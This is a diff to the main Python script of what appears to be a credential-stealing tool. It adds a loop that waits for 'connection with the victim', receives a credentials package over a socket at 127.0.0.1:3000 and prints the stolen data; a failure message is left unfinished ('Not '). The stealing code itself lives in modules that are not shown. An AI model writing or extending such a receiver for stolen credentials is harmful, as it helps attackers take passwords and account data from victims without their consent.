@@ -1,7 +1,9 @@
 from modules.core.Ui.AsciiArt import AsciiArt
 from modules.core.Ui.MarkdownDisplay import MarkdownComponent
+from modules.core.ReceiveData.ReceiverCredentials import ReceiverCredentials;
 
-import argparse, re, sys
+
+import argparse, re, sys, time
 
 
 
@@ -46,12 +48,31 @@ def main():
     markdownRender.Draw()    
 
 
+    asciiR.Warn("Wait for connection with the victim!");
+
+
+    for i in range(5):
+        try: 
+            asciiR.Info("Trying to establish connection..")
+            receiver = ReceiverCredentials("127.0.0.1", 3000);
+            data = receiver.ReceiverPackage();
+            break;
+
+        except:
+            asciiR.Failure(f"Victim not connected: Attempt: {i + 1}");
+            if(i == 4): sys.exit() 
+            time.sleep(1)
+
+
+    if(data == 'Database is locked database is locked'): 
+        asciiR.Failure("Not ")
+
+    asciiR.Success("Established connection!!");
+    print(data)
     
-    asciiR.Warn("Wait connections");
 
 
-
-
+    
 
 
     
